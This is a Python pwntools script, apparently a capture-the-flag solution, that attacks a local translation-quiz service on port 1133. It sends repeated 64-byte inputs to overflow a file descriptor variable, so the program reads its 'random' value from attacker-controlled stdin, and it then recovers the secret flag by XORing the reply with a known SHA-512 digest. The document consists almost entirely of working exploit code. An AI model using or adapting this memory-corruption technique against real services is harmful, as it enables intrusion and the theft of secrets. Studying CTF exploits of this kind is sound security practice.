#!/usr/bin/env python3

from pwn import *
import hashlib


s = remote("localhost", 1133)

def main():

    payload = b"A" * 64
    for i in range(251): # Iterate 251+1 times to overflow the file descriptor variable
        s.sendlineafter(b"Your translation: ", payload)
        s.recvuntil(b"That's not correct.\n")

    # The last iteration needs to be less than 64 bytes
    s.sendlineafter(b"Your translation: ",  b"Rebosar...")
    s.recvuntil(b"That's not correct.\n")

    # Send the 16-bytes input for the sha512 function
    urandom_from_stdin = b"Casuale!" * 2
    s.sendline(urandom_from_stdin)

    # Receive the secret ^ sha512(urandom_from_stdin)
    s.recvuntil(b"Translate this phrase: ")
    phrase = s.recv(64)

    # Reveal the flag
    grammar_rules = hashlib.sha512(urandom_from_stdin).digest()
    flag = bytes([a ^ b for a, b in zip(phrase, grammar_rules)])
    print(f"Flag: {flag.decode()}")

    s.interactive()


if __name__=="__main__":
	main()
